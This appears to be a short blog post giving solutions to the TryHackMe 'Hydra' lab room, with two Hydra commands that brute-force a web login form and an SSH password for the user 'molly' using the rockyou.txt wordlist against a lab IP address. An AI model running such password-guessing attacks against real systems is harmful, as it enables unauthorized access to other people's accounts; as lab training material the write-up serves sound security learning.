---
author: "Denis Nu\u021Biu"
categories:
- Security
- Tooling
date: '2020-02-29T23:31:01+00:00'
guid: https://nuculabs.dev/?p=869
id: 869
layout: post
permalink: /2020/02/29/brute-forcing-passwords-with-hydra/
tags:
- bruteforcing
- kali linux
- penetration testing
title: Brute-forcing passwords with Hydra
---
Hello,


In this article you will find the solutions for the Hydra room on Try Hack Me.


Link: 


Almost every bruteforcing or cracking task from HackTheBox/TryHackMe uses the rockyou.txt wordlist. You can google it and download it, if you can’t find it in your Kali distro under the path **/usr/share/wordlists/rockyou.txt.gz**


If you’re using Kali then you have Hydra already installed, all you have to do is run two commands:


### Flag 1


Run the following command, the password should be cracked in less than one minute.


```
```
root@kali:~/Desktop# hydra -l molly -P rockyou.txt 10.10.86.187 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
```
```


### Flag 2


Start bruteforcing the ssh password then logon via ssh as molly to grab the flag.


```
```
root@kali:~/Desktop# hydra -l molly -P rockyou.txt 10.10.86.187 -t 4 ssh
```
```


Thanks for reading!